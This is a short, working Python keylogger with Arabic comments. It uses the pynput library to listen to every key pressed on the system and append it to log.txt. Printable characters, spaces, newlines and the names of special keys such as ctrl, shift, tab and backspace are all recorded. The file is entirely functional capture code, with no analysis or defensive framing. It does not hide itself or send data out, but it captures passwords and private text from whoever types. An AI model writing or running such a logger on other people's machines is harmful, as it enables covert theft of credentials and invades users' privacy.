from pynput.keyboard import Listener, Key

def on_press(key):
    try:
        # فتح الملف باستخدام الترميز UTF-8
        with open("log.txt", "a", encoding="utf-8") as log_file:
            # تسجيل الحروف القابلة للطباعة
            if key.char:
                log_file.write(key.char)
    except AttributeError:
        # التعامل مع المفاتيح الخاصة مثل Enter وSpace
        with open("log.txt", "a", encoding="utf-8") as log_file:
            if key == Key.space:
                log_file.write(" ")  # تسجيل مسافة عند الضغط على Space
            elif key == Key.enter:
                log_file.write("\n")  # الانتقال إلى سطر جديد عند الضغط على Enter
            # تسجيل المفاتيح الخاصة في سطر منفصل
            elif key in [Key.alt, Key.ctrl, Key.shift, Key.shift_r, Key.caps_lock , Key.tab, Key.backspace]:
                log_file.write(f"\n{str(key)}\n")
            else:
                log_file.write(f"{str(key)}")  # تسجيل المفاتيح الأخرى كما هي

with Listener(on_press=on_press) as listener:
    listener.join()
